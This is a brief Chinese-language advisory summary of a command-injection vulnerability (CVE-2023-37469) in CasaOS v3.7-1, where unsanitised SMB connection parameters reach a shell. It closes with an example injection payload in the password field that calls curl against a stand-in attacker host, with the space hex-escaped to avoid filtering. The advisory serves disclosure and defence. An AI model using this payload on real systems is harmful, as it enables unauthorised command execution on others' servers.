# GHSL-2022-119: CasaOS中的任意命令执行漏洞 - CVE-2023-37469

## 概述
在CasaOS中，如果经过身份验证的用户成功连接到一个控制的SMB服务器，他们可以执行任意命令。

### 受影响版本
- CasaOS版本: v3.7-1

## 技术细节

- **漏洞来源**: 
  - `MountSmaba` 函数通过 `PostSambaConnectionsCreate` 调用，并且未对输入进行清理。
  
- **漏洞影响**: 
  - 在验证SMB共享时，如果攻击者提供恶意参数且这些参数在SMB服务器上有效，则可能发生命令注入。

### 漏洞示例
- 攻击者可以利用`password`参数进行命令注入。例如：
  ```bash
  ;CMD=$'\x20attackerdomain.com';curl$CMD
  ```
